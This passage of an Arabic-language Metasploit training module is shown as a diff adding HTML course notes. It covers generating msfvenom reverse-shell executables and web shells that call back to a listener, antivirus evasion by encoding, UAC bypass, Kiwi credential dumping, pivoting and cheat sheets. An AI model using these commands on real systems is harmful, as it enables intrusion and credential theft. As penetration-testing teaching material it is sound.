+<svg viewBox="0 0 700 180" xmlns="http://www.w3.org/2000/svg">
+  <!-- Non-Staged Row -->
+  <text x="10" y="22" class="dsvg-green" font-size="11" font-weight="700" font-family="IBM Plex Mono">Non-Staged (Inline)</text>
+  <rect x="10" y="30" width="280" height="55" rx="6" class="dsvg-box-g"/>
+  <text x="150" y="52" text-anchor="middle" class="dsvg-green" font-size="10" font-weight="700">Exploit + Complete Shellcode</text>
+  <text x="150" y="68" text-anchor="middle" class="dsvg-muted" font-size="9">One piece — no second stage</text>
+  <line x1="290" y1="57" x2="330" y2="57" class="dsvg-line-g"/>
+  <polygon points="330,52 340,57 330,62" class="dsvg-arr-g"/>
+  <rect x="340" y="30" width="120" height="55" rx="6" class="dsvg-box"/>
+  <text x="400" y="52" text-anchor="middle" class="dsvg-txt" font-size="10" font-weight="700">Target</text>
+  <text x="400" y="68" text-anchor="middle" class="dsvg-green" font-size="9">✓ Stable</text>
+  <rect x="480" y="22" width="210" height="71" rx="6" class="dsvg-box-g"/>
+  <text x="585" y="40" text-anchor="middle" class="dsvg-green" font-size="9" font-weight="700">Name: NO slash</text>
+  <text x="585" y="55" text-anchor="middle" class="dsvg-muted" font-size="9">windows/x64/shell_reverse_tcp</text>
+  <text x="585" y="70" text-anchor="middle" class="dsvg-muted" font-size="9">linux/x64/meterpreter_reverse_tcp</text>
+  <text x="585" y="85" text-anchor="middle" class="dsvg-green" font-size="9">↑ underscore meterpreter</text>
+
+  <!-- Staged Row -->
+  <text x="10" y="118" class="dsvg-amber" font-size="11" font-weight="700" font-family="IBM Plex Mono">Staged (Two-Stage)</text>
+  <rect x="10" y="126" width="180" height="45" rx="6" class="dsvg-box-a"/>
+  <text x="100" y="144" text-anchor="middle" class="dsvg-amber" font-size="10" font-weight="700">Exploit + Stager</text>
+  <text x="100" y="159" text-anchor="middle" class="dsvg-muted" font-size="9">Tiny first stage</text>
+  <line x1="190" y1="149" x2="210" y2="149" class="dsvg-line"/>
+  <polygon points="210,144 220,149 210,154" class="dsvg-arr"/>
+  <rect x="220" y="126" width="95" height="45" rx="6" class="dsvg-box"/>
+  <text x="267" y="144" text-anchor="middle" class="dsvg-txt" font-size="10">Target</text>
+  <text x="267" y="159" text-anchor="middle" class="dsvg-muted" font-size="8">connects back</text>
+  <line x1="315" y1="149" x2="335" y2="149" class="dsvg-line"/>
+  <polygon points="335,144 345,149 335,154" class="dsvg-arr"/>
+  <rect x="345" y="118" width="130" height="61" rx="6" class="dsvg-box-b"/>
+  <text x="410" y="138" text-anchor="middle" class="dsvg-blue" font-size="10" font-weight="700">Stage 2</text>
+  <text x="410" y="153" text-anchor="middle" class="dsvg-muted" font-size="8">Full Meterpreter</text>
+  <text x="410" y="168" text-anchor="middle" class="dsvg-blue" font-size="8">sent to target</text>
+  <rect x="488" y="118" width="202" height="61" rx="6" class="dsvg-box-a"/>
+  <text x="589" y="138" text-anchor="middle" class="dsvg-amber" font-size="9" font-weight="700">Name: WITH slash /</text>
+  <text x="589" y="153" text-anchor="middle" class="dsvg-muted" font-size="9">windows/x64/meterpreter/reverse_tcp</text>
+  <text x="589" y="168" text-anchor="middle" class="dsvg-amber" font-size="9">↑ slash = staged</text>
+</svg>
+<div class="diagram-caption">النقطة: slash (/) = Staged | underscore (_) في meterpreter = Non-Staged — قرار مهم يحدَّد بحجم الـ Buffer</div>
+</div>
+
+<h3>Meterpreter — أقوى Payload</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ Meterpreter</div>
+<p>بيشتغل <strong>في الذاكرة فقط</strong> — لا ملف على القرص. الاتصال مُشفَّر (AES-256 للـ HTTPS). قابل للتوسيع وقت التشغيل بدون Exploits جديدة. متعدد المنصات: Windows, Linux, macOS, Android.</p>
+</div>
+
+<div class="table-wrap"><table>
+<thead><tr><th>الأمر</th><th>الوظيفة</th></tr></thead>
+<tbody>
+<tr><td><code>sysinfo</code></td><td>معلومات النظام — OS, Hostname, Architecture, Language</td></tr>
+<tr><td><code>getuid</code></td><td>المستخدم الحالي (قبل وبعد رفع الامتيازات)</td></tr>
+<tr><td><code>getpid</code></td><td>PID عملية Meterpreter الحالية</td></tr>
+<tr><td><code>ps</code></td><td>كل العمليات الجارية مع PID والمستخدم والمسار</td></tr>
+<tr><td><code>migrate &lt;PID&gt;</code></td><td>نقل Meterpreter لعملية أخرى</td></tr>
+<tr><td><code>getsystem</code></td><td>محاولة رفع الامتيازات تلقائياً لـ SYSTEM</td></tr>
+<tr><td><code>hashdump</code></td><td>تفريغ هاشات SAM (يحتاج SYSTEM)</td></tr>
+<tr><td><code>idletime</code></td><td>وقت خمول المستخدم — قبل تشغيل عمليات واضحة</td></tr>
+<tr><td><code>execute -f notepad.exe -H</code></td><td>تشغيل عملية جديدة بنافذة مخفية للـ Migration</td></tr>
+<tr><td><code>download &lt;file&gt;</code></td><td>تنزيل ملف من الهدف</td></tr>
+<tr><td><code>upload &lt;file&gt;</code></td><td>رفع ملف للهدف</td></tr>
+<tr><td><code>shell</code></td><td>فتح OS Shell تفاعلي</td></tr>
+</tbody>
+</table></div>
+
+<h3>msfvenom — توليد Payloads مستقلة</h3>
+<div class="code-wrap"><span class="code-tag">bash — msfvenom</span><pre><code># استعراض الـ Payloads المتاحة
+msfvenom -l payloads | grep windows/x64
+
+# ===== أمثلة شائعة =====
+# Windows EXE — Non-Staged Shell
+msfvenom -p windows/x64/shell_reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 \
+          -f exe -o payload.exe
+
+# Windows EXE — Staged Meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 \
+          -f exe -o meter.exe
+
+# Linux ELF
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 \
+          -f elf -o payload.elf
+
+# PowerShell One-liner
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 -f ps1
+
+# مع Encoding لتهرّب الـ AV
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 \
+          -e x64/xor_dynamic -i 5 \
+          -f exe -o encoded.exe
+</code></pre></div>
+
+<div class="table-wrap"><table>
+<thead><tr><th>Format (-f)</th><th>المنصة</th><th>حالة الاستخدام</th></tr></thead>
+<tbody>
+<tr><td><code>exe</code></td><td>Windows</td><td>Standard executable</td></tr>
+<tr><td><code>dll</code></td><td>Windows</td><td>DLL Injection attacks</td></tr>
+<tr><td><code>ps1 / psh</code></td><td>Windows</td><td>PowerShell delivery</td></tr>
+<tr><td><code>aspx / jsp / php</code></td><td>Web</td><td>Web shell على خوادم مخترَقة</td></tr>
+<tr><td><code>elf</code></td><td>Linux/Unix</td><td>Linux binary</td></tr>
+<tr><td><code>elf-so</code></td><td>Linux/Unix</td><td>Shared object للـ Injection</td></tr>
+<tr><td><code>apk</code></td><td>Android</td><td>Trojanized Android app</td></tr>
+</tbody>
+</table></div>
+
+<h3>multi/handler — استقبال الـ Staged Payloads</h3>
+<div class="callout tip">
+<div class="callout-label">✓ لماذا multi/handler</div>
+<p>Netcat لا يستطيع تسليم Stage 2 للـ Staged Payloads. multi/handler يعالج كل أنواع الـ Payloads. شغَّله كـ Background Job (<code>run -j</code>) عشان الـ Console يفضل حر لاستقبال اتصالات متعددة.</p>
+</div>
+<div class="code-wrap"><span class="code-tag">msfconsole — multi/handler</span><pre><code">use exploit/multi/handler
+# لازم يتطابق مع msfvenom output تماماً
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.118.4
+set LPORT 4444
+# تشغيل كـ Background Job
+run -j
+# [*] Started reverse TCP handler on 0.0.0.0:4444
+
+# لما الضحية تشغَّل الـ Payload:
+# [*] Meterpreter session 1 opened
+sessions -i 1
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU5 -->
+<h2 id="lu5"><span class="num">05</span><span class="htext">Post-Exploitation — Meterpreter وUAC Bypass وKiwi</span></h2>
+
+<h3>أهداف مرحلة ما بعد الاستغلال</h3>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span><strong>Privilege Escalation:</strong> الوصول لـ SYSTEM/root</span></div>
+  <div class="goal-card"><span class="gi">2</span><span><strong>Persistence:</strong> البقاء بعد Reboot</span></div>
+  <div class="goal-card"><span class="gi">3</span><span><strong>Credential Harvesting:</strong> جمع الهاشات وكلمات المرور والـ Tickets</span></div>
+  <div class="goal-card"><span class="gi">4</span><span><strong>Lateral Movement:</strong> التوسُّع لأجهزة أخرى</span></div>
+  <div class="goal-card"><span class="gi">5</span><span><strong>Data Exfiltration:</strong> استخراج البيانات الحساسة</span></div>
+  <div class="goal-card"><span class="gi">6</span><span><strong>Situational Awareness:</strong> فهم البيئة الكاملة</span></div>
+</div>
+
+<h3>أول خطوات بعد فتح الـ Session</h3>
+<div class="code-wrap"><span class="code-tag">meterpreter — first steps</span><pre><code># 1. مين أنا؟
+getuid
+# Server username: CLIENT01\dave
+
+# 2. وقت خمول المستخدم (آمن للتشغيل؟)
+idletime
+# User has been idle for: 0 hours 3 mins 22 secs
+
+# 3. رفع الامتيازات تلقائياً
+getsystem
+# ...got system via technique 5 (Named Pipe Impersonation)
+
+# 4. التحقق
+getuid
+# Server username: NT AUTHORITY\SYSTEM ✓
+
+# 5. Migration لعملية مستقرة
+ps | grep -i explorer
+migrate 4768
+# Successfully migrated to process 4768
+</code></pre></div>
+
+<div class="callout note">
+<div class="callout-label">📌 لماذا Migration مهمة</div>
+<p>بدون Migration: لو العملية الأصلية اتقفلت → Session تختفي فوراً. اسم عملية مشبوه (payload.exe) يظهر للمدافعين. Migration لـ <code>explorer.exe</code> أو <code>svchost.exe</code> بيخفي Meterpreter في عملية شرعية.</p>
+</div>
+
+<h3>UAC Bypass</h3>
+<p>UAC بيقيَّد حتى حسابات Administrators — بيشتغلوا بـ Medium Integrity افتراضياً. مش ممكن: تثبيت خدمات، تعديل Registry، تعطيل AV، تفريغ الهاشات.</p>
+<div class="code-wrap"><span class="code-tag">msfconsole — uac bypass</span><pre><code"># فحص مستوى النزاهة ومقترحات الـ Exploit
+run post/multi/recon/local_exploit_suggester
+
+# Background الـ Session الحالي
+background
+
+# تحميل UAC Bypass Module
+use post/windows/escalate/bypassuac_fodhelper
+set SESSION 1
+run
+# [*] Meterpreter session 2 opened at HIGH integrity
+
+# التفاعل مع Session الجديدة
+sessions -i 2
+getuid   # نفس المستخدم
+getsystem  # الآن يصل لـ SYSTEM!
+</code></pre></div>
+
+<h3>Kiwi — استخراج بيانات الاعتماد</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ Kiwi Extension</div>
+<p>Kiwi هو تكامل Mimikatz المدمج في Metasploit — يستخرج NTLM Hashes وكلمات مرور Plaintext وـ Kerberos Tickets. يشتغل في الذاكرة فقط — لا ملف على القرص. يحتاج SYSTEM.</p>
+</div>
+<div class="code-wrap"><span class="code-tag">meterpreter — kiwi</span><pre><code"># تأكَّد من SYSTEM أولاً
+getsystem
+
+# تحميل امتداد Kiwi
+load kiwi
+# Loading extension kiwi...Success.
+
+# تفريغ كل بيانات الاعتماد
+creds_all
+
+# NTLM Hashes فقط من SAM
+lsa_dump_sam
+
+# Kerberos Tickets
+kerberos_ticket_list
+kerberos_ticket_use <ticket_file>
+
+# بيانات الاعتماد تُحفَظ في MSF DB تلقائياً
+creds  # عرض كل ما جُمع
+</code></pre></div>
+
+<h3>أهم Post-Exploitation Modules</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الموديول</th><th>الوظيفة</th></tr></thead>
+<tbody>
+<tr><td><code>post/multi/recon/local_exploit_suggester</code></td><td>اقتراح Exploits لرفع الامتيازات بناءً على إصدار OS</td></tr>
+<tr><td><code>post/windows/gather/hashdump</code></td><td>تفريغ كل هاشات SAM (يحتاج SYSTEM)</td></tr>
+<tr><td><code>post/windows/gather/credentials/credential_collector</code></td><td>جمع كل أنواع بيانات الاعتماد من Windows</td></tr>
+<tr><td><code>post/windows/manage/migrate</code></td><td>Auto-Migration لعملية أكثر استقراراً</td></tr>
+<tr><td><code>post/windows/escalate/bypassuac</code></td><td>تجاوز UAC على حسابات Administrator</td></tr>
+<tr><td><code>post/multi/manage/shell_to_meterpreter</code></td><td>ترقية Shell بسيط لـ Meterpreter</td></tr>
+<tr><td><code>post/windows/gather/enum_shares</code></td><td>تعداد SMB Shares من الهدف</td></tr>
+</tbody>
+</table></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU6 -->
+<h2 id="lu6"><span class="num">06</span><span class="htext">Pivoting — Routes وSOCKS وPort Forwarding</span></h2>
+
+<h3>Pivoting — المفهوم</h3>
+<p>Pivoting = استخدام جهاز مخترَق كبوابة للوصول لشبكات جديدة. الجهاز الأولي غالبًا بيملك واجهتين — WAN وLAN داخلي. بدون Pivoting: المهاجم لا يرى الشبكة الداخلية. مع Pivoting: الترافيك يُوجَّه عبر الجهاز المخترَق بشكل شفاف.</p>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 145" xmlns="http://www.w3.org/2000/svg">
+  <!-- Attacker -->
+  <rect x="8" y="40" width="120" height="65" rx="7" class="dsvg-box-b"/>
+  <text x="68" y="65" text-anchor="middle" class="dsvg-blue" font-size="11" font-weight="700">Attacker</text>
+  <text x="68" y="81" text-anchor="middle" class="dsvg-muted" font-size="9">Kali</text>
+  <text x="68" y="96" text-anchor="middle" class="dsvg-blue" font-size="9">MSF + Routes</text>
+
+  <!-- Arrow -->
+  <line x1="128" y1="72" x2="163" y2="72" class="dsvg-line-g"/>
+  <polygon points="163,67 173,72 163,77" class="dsvg-arr-g"/>
+
+  <!-- Pivot Host -->
+  <rect x="173" y="22" width="168" height="101" rx="7" class="dsvg-box-a" style="stroke-width:2;"/>
+  <text x="257" y="46" text-anchor="middle" class="dsvg-amber" font-size="11" font-weight="700">Pivot Host</text>
+  <text x="257" y="62" text-anchor="middle" class="dsvg-muted" font-size="9">eth0: 192.168.50.X (WAN)</text>
+  <text x="257" y="78" text-anchor="middle" class="dsvg-muted" font-size="9">eth1: 10.10.10.X (Internal)</text>
+  <text x="257" y="97" text-anchor="middle" class="dsvg-amber" font-size="9" font-weight="700">Meterpreter Session Active</text>
+  <text x="257" y="113" text-anchor="middle" class="dsvg-muted" font-size="8">Two NICs = Pivot point</text>
+
+  <!-- Arrow to internal -->
+  <line x1="341" y1="72" x2="381" y2="72" class="dsvg-line"/>
+  <polygon points="381,67 391,72 381,77" class="dsvg-arr"/>
+
+  <!-- Internal Network -->
+  <rect x="391" y="14" width="301" height="117" rx="7" class="dsvg-box-p"/>
+  <text x="541" y="38" text-anchor="middle" font-size="11" font-weight="700" style="fill:var(--purple)">Internal Network</text>
+  <text x="541" y="54" text-anchor="middle" class="dsvg-muted" font-size="9">10.10.10.0/24</text>
+  <text x="454" y="76" text-anchor="middle" font-size="9" style="fill:var(--purple)">DB Server</text>
+  <text x="541" y="76" text-anchor="middle" font-size="9" style="fill:var(--purple)">File Server</text>
+  <text x="628" y="76" text-anchor="middle" font-size="9" style="fill:var(--purple)">DC</text>
+  <rect x="410" y="84" width="70" height="36" rx="4" class="dsvg-box"/>
+  <rect x="498" y="84" width="70" height="36" rx="4" class="dsvg-box"/>
+  <rect x="586" y="84" width="95" height="36" rx="4" class="dsvg-box"/>
+  <text x="445" y="105" text-anchor="middle" class="dsvg-muted" font-size="8">10.10.10.5</text>
+  <text x="533" y="105" text-anchor="middle" class="dsvg-muted" font-size="8">10.10.10.10</text>
+  <text x="633" y="105" text-anchor="middle" class="dsvg-muted" font-size="8">10.10.10.1</text>
+
+  <text x="350" y="136" text-anchor="middle" class="dsvg-muted" font-size="9">↑ Attacker لا يرى الشبكة الداخلية بدون Pivoting — Meterpreter هو البوابة</text>
+</svg>
+<div class="diagram-caption">Pivot Host بيربط WAN بالشبكة الداخلية — Meterpreter Session هو القناة</div>
+</div>
+
+<h3>Routes — Pivoting داخل MSF</h3>
+<div class="code-wrap"><span class="code-tag">meterpreter + msfconsole — routes</span><pre><code># من داخل Meterpreter Session:
+ipconfig
+# eth1: 10.10.10.0/24 ← الشبكة الداخلية
+
+background
+
+# الطريقة 1 — Route يدوي
+route add 10.10.10.0/24 1   # 1 = Session ID
+route print
+
+# الطريقة 2 — autoroute (الأفضل)
+use post/multi/manage/autoroute
+set SESSION 1
+run
+# [+] Route added to subnet 10.10.10.0/255.255.255.0 via session 1
+# [+] All subnets auto-discovered!
+
+# الآن MSF Modules تعمل على الشبكة الداخلية
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.10.10.0/24
+set PORTS 22,80,445,3389
+run
+# ⚠ Nmap خارج MSF لا يعمل عبر MSF Routes!
+</code></pre></div>
+
+<h3>SOCKS Proxy — Pivoting لكل الأدوات</h3>
+<p>MSF Routes تعمل فقط مع MSF Modules. SOCKS Proxy بيسمح لـ Nmap وSmbclient وBrowser وكل شيء بالـ Pivot.</p>
+<div class="code-wrap"><span class="code-tag">msfconsole — socks proxy</span><pre><code"># تشغيل SOCKS Proxy Server
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set VERSION 5
+run -j
+# [*] SOCKS proxy running on 127.0.0.1:9050
+
+# تعديل /etc/proxychains4.conf
+# آخر سطر: socks5 127.0.0.1 9050
+
+# الآن أي أداة ممكن تـ Pivot عبر proxychains
+proxychains nmap -sT -Pn 10.10.10.5
+proxychains smbclient //10.10.10.10/share
+proxychains ssh user@10.10.10.5
+proxychains evil-winrm -i 10.10.10.1 -u admin -p Pass
+</code></pre></div>
+
+<h3>Meterpreter Port Forwarding</h3>
+<div class="code-wrap"><span class="code-tag">meterpreter — portfwd</span><pre><code"># إعادة توجيه بورت واحد — أبسط من SOCKS للخدمة المحدَّدة
+portfwd add -l 3389 -r 10.10.10.5 -p 3389
+# الاتصال بـ RDP الداخلي عبر Kali:3389
+xfreerdp /u:admin /p:Password1 /v:127.0.0.1:3389
+
+# Database server
+portfwd add -l 5432 -r 10.10.10.10 -p 5432
+psql -h 127.0.0.1 -p 5432 -U postgres
+
+# عرض كل الـ Forwards
+portfwd list
+
+# حذف Forward
+portfwd delete -l 3389 -r 10.10.10.5 -p 3389
+</code></pre></div>
+
+<div class="table-wrap"><table>
+<thead><tr><th>الأسلوب</th><th>يعمل مع</th><th>الإعداد</th><th>الأفضل لـ</th></tr></thead>
+<tbody>
+<tr><td>MSF Routes</td><td>MSF Modules فقط</td><td><code>route add</code> أو <code>autoroute</code></td><td>Scanning &amp; Exploiting بموديولات MSF</td></tr>
+<tr><td>SOCKS + Proxychains</td><td>كل الأدوات</td><td>socks_proxy + تعديل proxychains.conf</td><td>Multi-target scanning, أدوات متنوعة</td></tr>
+<tr><td>Port Forwarding</td><td>كل الأدوات</td><td><code>portfwd add</code></td><td>خدمة واحدة محدَّدة (RDP, DB)</td></tr>
+</tbody>
+</table></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU7 -->
+<h2 id="lu7"><span class="num">07</span><span class="htext">Automation — Resource Scripts وأمن العمليات</span></h2>
+
+<h3>Resource Scripts — الأتمتة</h3>
+<p>Resource Scripts بتحتوي تسلسلاً من أوامر MSFconsole يُنفَّذ تلقائياً. تستطيع أيضاً تضمين Ruby Code للمنطق الشرطي. تُشغَّل عند البدء بـ <code>-r</code> flag أو من داخل MSF بـ <code>resource</code>.</p>
+
+<div class="code-wrap"><span class="code-tag">bash — listener.rc</span><pre><code"># listener.rc — Handler آلي كامل
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.118.4
+set LPORT 4444
+# Auto-migrate فور فتح الـ Session
+set AutoRunScript post/windows/manage/migrate
+# البقاء مفتوحاً لاتصالات متعددة
+set ExitOnSession false
+# تشغيل كـ Background Job
+exploit -j
+# Listener شغّال في الخلفية!
+
+# ===== تشغيل الـ Script =====
+# عند البدء:
+sudo msfconsole -r listener.rc
+
+# من داخل MSF:
+resource /path/to/listener.rc
+
+# Built-in scripts:
+ls /usr/share/metasploit-framework/scripts/resource/
+</code></pre></div>
+
+<h3>أمن العمليات (OPSEC) مع MSF</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>المشكلة</th><th>الحل</th></tr></thead>
+<tbody>
+<tr><td>Meterpreter signatures معروفة للـ AV</td><td>Encoding مع <code>-e</code> و<code>-i</code> flags + Custom payloads</td></tr>
+<tr><td>اسم عملية مشبوه (payload.exe)</td><td>Migration فوري لعملية شرعية (explorer.exe, svchost.exe)</td></tr>
+<tr><td>كتابة ملفات على القرص</td><td>تفضيل العمليات في الذاكرة — Meterpreter In-Memory</td></tr>
+<tr><td>ترافيك واضح</td><td>استخدام Meterpreter HTTPS بدل TCP (يبدو ويب)</td></tr>
+<tr><td>Scanner threads عالية = صاخب</td><td>تقليل THREADS — بطيء لكن أقل كشفاً</td></tr>
+<tr><td>العمل أثناء نشاط المستخدم</td><td>فحص <code>idletime</code> قبل عمليات مرئية</td></tr>
+</tbody>
+</table></div>
+
+<h3>سير العمل الكامل — Metasploit Attack Flow</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 90" xmlns="http://www.w3.org/2000/svg">
+  <rect x="4"   y="15" width="88" height="55" rx="6" class="dsvg-box-b"/>
+  <text x="48"  y="38" text-anchor="middle" class="dsvg-blue" font-size="10" font-weight="700">Recon</text>
+  <text x="48"  y="55" text-anchor="middle" class="dsvg-muted" font-size="8">db_nmap</text>
+  <text x="48"  y="67" text-anchor="middle" class="dsvg-muted" font-size="8">auxiliary/*</text>
+  <line x1="92"  y1="42" x2="106" y2="42" class="dsvg-line"/>
+  <polygon points="106,37 116,42 106,47" class="dsvg-arr"/>
+  <rect x="116" y="15" width="88" height="55" rx="6" class="dsvg-box-r"/>
+  <text x="160" y="38" text-anchor="middle" class="dsvg-red" font-size="10" font-weight="700">Exploit</text>
+  <text x="160" y="55" text-anchor="middle" class="dsvg-muted" font-size="8">exploit/*</text>
+  <text x="160" y="67" text-anchor="middle" class="dsvg-muted" font-size="8">EternalBlue...</text>
+  <line x1="204" y1="42" x2="218" y2="42" class="dsvg-line"/>
+  <polygon points="218,37 228,42 218,47" class="dsvg-arr"/>
+  <rect x="228" y="15" width="88" height="55" rx="6" class="dsvg-box-a"/>
+  <text x="272" y="38" text-anchor="middle" class="dsvg-amber" font-size="10" font-weight="700">Session</text>
+  <text x="272" y="55" text-anchor="middle" class="dsvg-muted" font-size="8">Meterpreter</text>
+  <text x="272" y="67" text-anchor="middle" class="dsvg-muted" font-size="8">sessions -i 1</text>
+  <line x1="316" y1="42" x2="330" y2="42" class="dsvg-line"/>
+  <polygon points="330,37 340,42 330,47" class="dsvg-arr"/>
+  <rect x="340" y="7" width="88" height="71" rx="6" class="dsvg-box-r" style="stroke-width:2;"/>
+  <text x="384" y="32" text-anchor="middle" class="dsvg-red" font-size="10" font-weight="700">PrivEsc</text>
+  <text x="384" y="48" text-anchor="middle" class="dsvg-muted" font-size="8">getsystem</text>
+  <text x="384" y="62" text-anchor="middle" class="dsvg-muted" font-size="8">UAC Bypass</text>
+  <text x="384" y="72" text-anchor="middle" class="dsvg-red" font-size="8">SYSTEM!</text>
+  <line x1="428" y1="42" x2="442" y2="42" class="dsvg-line"/>
+  <polygon points="442,37 452,42 442,47" class="dsvg-arr"/>
+  <rect x="452" y="15" width="88" height="55" rx="6" class="dsvg-box-p"/>
+  <text x="496" y="38" text-anchor="middle" font-size="10" font-weight="700" style="fill:var(--purple)">Post</text>
+  <text x="496" y="55" text-anchor="middle" class="dsvg-muted" font-size="8">Kiwi/Hashdump</text>
+  <text x="496" y="67" text-anchor="middle" class="dsvg-muted" font-size="8">Persistence</text>
+  <line x1="540" y1="42" x2="554" y2="42" class="dsvg-line"/>
+  <polygon points="554,37 564,42 554,47" class="dsvg-arr"/>
+  <rect x="564" y="15" width="130" height="55" rx="6" class="dsvg-box-g"/>
+  <text x="629" y="35" text-anchor="middle" class="dsvg-green" font-size="10" font-weight="700">Pivot</text>
+  <text x="629" y="50" text-anchor="middle" class="dsvg-muted" font-size="8">autoroute + SOCKS</text>
+  <text x="629" y="64" text-anchor="middle" class="dsvg-green" font-size="8">Lateral Movement →</text>
+</svg>
+<div class="diagram-caption">كل مرحلة تُمكَّن المرحلة التالية — من Target واحد لشبكة كاملة</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ CHEAT SHEET -->
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+
+<h4>MSFconsole Quick Reference</h4>
+<div class="code-wrap"><span class="code-tag">msfconsole — complete reference</span><pre><code># ===== SETUP =====
+sudo msfdb init
+sudo msfconsole
+db_status
+workspace -a CLIENT1 && workspace CLIENT1
+
+# ===== SEARCH & LOAD =====
+search type:exploit platform:windows name:smb
+search CVE-2017-0144
+search type:auxiliary rank:excellent
+use <module_path>
+info && show options
+
+# ===== SET & RUN =====
+set RHOSTS 192.168.50.0/24
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.118.4
+set LPORT 4444
+set THREADS 10
+setg RHOSTS 192.168.50.0/24   # Global option
+run / exploit
+run -j                          # Run as background job
+
+# ===== DB COMMANDS =====
+db_nmap -sV -p- 192.168.50.0/24
+hosts && hosts -R
+services -p 445 -R
+creds && loot && vulns
+
+# ===== SESSIONS =====
+sessions               # List
+sessions -i 1          # Interact
+sessions -k 1          # Kill
+sessions -K            # Kill ALL
+sessions -u 1          # Upgrade to Meterpreter
+background / bg / Ctrl+Z
+</code></pre></div>
+
+<h4>Meterpreter Quick Reference</h4>
+<div class="code-wrap"><span class="code-tag">meterpreter — complete reference</span><pre><code># ===== SITUATIONAL AWARENESS =====
+sysinfo && getuid && getpid
+idletime
+ps && ps | grep -i explorer
+
+# ===== PRIVILEGE ESCALATION =====
+getsystem
+run post/multi/recon/local_exploit_suggester
+background
+use post/windows/escalate/bypassuac_fodhelper
+set SESSION 1 && run
+
+# ===== MIGRATION =====
+execute -f notepad.exe -H
+migrate <PID>
+
+# ===== CREDENTIAL EXTRACTION =====
+hashdump
+load kiwi
+creds_all
+lsa_dump_sam
+kerberos_ticket_list
+
+# ===== FILE OPERATIONS =====
+download /path/to/file
+upload /local/file /remote/path
+ls && pwd && cd
+cat /etc/passwd
+
+# ===== PIVOTING =====
+ipconfig / ifconfig
+background
+route add 10.10.10.0/24 1
+use post/multi/manage/autoroute / set SESSION 1 / run
+portfwd add -l 3389 -r 10.10.10.5 -p 3389
+</code></pre></div>
+
+<h4>msfvenom Quick Reference</h4>
+<div class="code-wrap"><span class="code-tag">bash — msfvenom</span><pre><code"># Windows EXE (Staged Meterpreter)
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 -f exe -o meter.exe
+
+# Windows PowerShell
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 -f ps1 > meter.ps1
+
+# Linux ELF
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 -f elf -o meter.elf
+
+# Web Shells
+msfvenom -p php/meterpreter/reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 -f raw -o shell.php
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 -f aspx -o shell.aspx
+
+# مع Encoding
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 \
+          -e x64/xor_dynamic -i 10 -f exe -o encoded.exe
+
+# Bad characters (لاستغلال Buffer Overflow يدوي)
+msfvenom -p windows/x64/shell_reverse_tcp \
+          LHOST=192.168.118.4 LPORT=4444 \
+          -b "\x00\x0a\x0d" -f c
+</code></pre></div>
+
+<h4>Common Attack Combinations</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>السيناريو</th><th>الأوامر</th></tr></thead>
+<tbody>
+<tr><td>EternalBlue → SYSTEM</td><td><code>smb_ms17_010</code> check → <code>ms17_010_eternalblue</code> + Meterpreter → <code>getsystem</code></td></tr>
+<tr><td>SSH Brute → Shell → Meterpreter</td><td><code>ssh_login</code> → shell session → <code>sessions -u 1</code></td></tr>
+<tr><td>Admin Shell → Creds</td><td><code>getsystem</code> → <code>migrate</code> → <code>load kiwi</code> → <code>creds_all</code></td></tr>
+<tr><td>Single Host → Network</td><td><code>ipconfig</code> → <code>autoroute</code> → <code>socks_proxy</code> → proxychains</td></tr>
+<tr><td>Automated Handler</td><td><code>msfconsole -r listener.rc</code> + <code>AutoRunScript migrate</code></td></tr>
+</tbody>
+</table></div>
+
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ SUMMARY -->
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>الموديول ده غطّى Metasploit Framework من الألف للياء — من إعداد الـ DB وتنظيم الـ Workspaces، للاستكشاف بـ Auxiliary Modules، للاستغلال بـ Exploit Modules، لتوليد الـ Payloads بـ msfvenom، لـ Post-Exploitation وكسر بيانات الاعتماد بـ Kiwi، والتنقّل داخل الشبكة بـ Pivoting.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module18_summary.txt</div>
+<ul>
+<li>MSF منظَّم في 6 أنواع موديولات: auxiliary, exploit, payload, post, encoder, nop</li>
+<li>PostgreSQL وWorkspaces ضروريان لتنظيم وعزل بيانات كل Engagement</li>
+<li>Auxiliary Modules للـ Recon وهجمات Credentials بدون استغلال ثغرات</li>
+<li>Exploit Rank: Excellent أولاً — Low و Manual بحذر شديد وفي Lab أولاً</li>
